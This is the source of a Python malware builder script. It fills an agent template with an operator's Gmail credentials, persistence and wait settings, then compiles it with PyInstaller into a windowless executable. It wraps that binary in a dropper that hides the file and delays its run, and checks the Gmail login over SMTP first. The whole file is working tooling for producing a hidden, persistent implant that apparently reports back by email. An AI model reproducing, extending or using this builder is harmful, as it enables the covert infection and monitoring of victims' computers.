# Date: 09/01/2018
# Author: Pure-L0G1C
# Description: Execute creator

import os  
import sys 
import shlex 
import shutil
import smtplib 
import tempfile
from lib.file import File
from lib.args import Args
from agent.lib.const import GmailConst
 
try:
    from PyInstaller import __main__ as pyi, is_win
except:
    print('Please install Pyinstaller: pip install pyinstaller')
    sys.exit(1)


class Executor(object):

    def __init__(self, email, password, filename, delay, wait, exe, icon, hide, persist):
        self.exe = exe
        self.hide = hide
        self.icon = icon
        self.wait = wait
        self.binary = b''
        self.email = email
        self.delay = delay
        self.persist = persist
        self.filename = filename
        self.password = password
        self.tmp_dir = tempfile.mkdtemp()

        self.output_dir = 'output'
        self.dist_path = os.path.join(self.tmp_dir, 'application')

        self.agent_template = 'agent' + os.path.sep + 'template_agent.py'
        self.agent_py_temp = 'agent' + os.path.sep + '{}.py'.format(filename)
        self.agent_compiled = self.dist_path + os.path.sep + '{}.exe'.format(filename)

        self.dropper_template = 'lib' + os.path.sep + 'dropper.py'
        self.dropper_py_temp = '{}.py'.format(filename)

    def replace(self, data, _dict):
        for k in _dict:
            data = data.replace(k, _dict[k])
        return data

    def compile_file(self, path):
        path = os.path.abspath(path)

        build_path = os.path.join(self.tmp_dir, 'build')
        cmd = 'pyinstaller -y -F -w {}'.format(shlex.quote(path))

        sys.argv = shlex.split(cmd) + ['--distpath', self.dist_path] + ['--workpath', build_path] + ['--specpath', self.tmp_dir]
        pyi.run()

    def write_template(self, template, py_temp, _dict):
        data = ''
        for _data in File.read(template, False):
            data += _data

        File.write(py_temp, self.replace(data, _dict))
        if self.exe:
            self.compile_file(py_temp)

    def compile_agent(self):
        _dict = {
            'wait_time': str(self.wait),
            'auto_persist': repr(self.persist),
            'user_email': '\'{}\''.format(self.email),
            'user_password': '\'{}\''.format(self.password)
        }

        self.write_template(self.agent_template, self.agent_py_temp, _dict)
        if self.exe:
            with open(self.agent_compiled, 'rb') as f:
                self.binary = f.read()

    def compile_dropper(self):
        _dict = {
         'data_name': repr('_{}.exe'.format(self.filename)),
         'data_binary': repr(self.binary),
         'data_hide': str(self.hide),
         'data_delay': str(self.delay)
        }

        self.write_template(self.dropper_template, self.dropper_py_temp, _dict)
    
    def move_file(self, file):
        if not os.path.exists(self.output_dir):
            os.mkdir(self.output_dir)
        else:
            _path = os.path.join(self.output_dir, file)
            if os.path.exists(_path):
                os.remove(_path)

        path = os.path.join(self.dist_path, file)
        shutil.move(path, self.output_dir)

    def start(self):
        self.compile_agent()
        if self.exe:
            self.compile_dropper()
            file = os.listdir(self.dist_path)[0]
            self.move_file(file)
            self.clean_up()        

    def clean_up(self):
        shutil.rmtree(self.tmp_dir)
        os.remove(self.agent_py_temp)
        os.remove(self.dropper_py_temp)

def validate_creds(email, pwd):
    try:
        server = smtplib.SMTP(GmailConst.SMTP_SERVER.value)
        server.connect(GmailConst.SMTP_SERVER.value, GmailConst.SMTP_PORT.value)

        server.starttls()
        server.login(email, pwd)

        server.quit()
    except smtplib.SMTPAuthenticationError:
        print('\nError: Unable to login\n\nCheck your credentials and ensure that less-secure-apps is enabled on your account.')
        print('Visit {}'.format(GmailConst.LESS_SECURE_APPS.value))
        return False 

    except ConnectionError:
        print('\nError: Unable to access Gmail') 
        return False 

    return True 

def main(args):
    executor = Executor(args.email, args.password, args.name, args.delay, args.wait, args.type, args.icon, args.hide, args.persist)
    
    if validate_creds(args.email, args.password):
        executor.start() 
        os.system('cls' if is_win else 'clear')

        print('Finished processing file')
        print('Look in the directory named output for your exe file' if executor.exe else 
                'Look in the directory named agent for your Python file')


if __name__ == '__main__':
    args = Args()
    if args.set_args():
        main(args)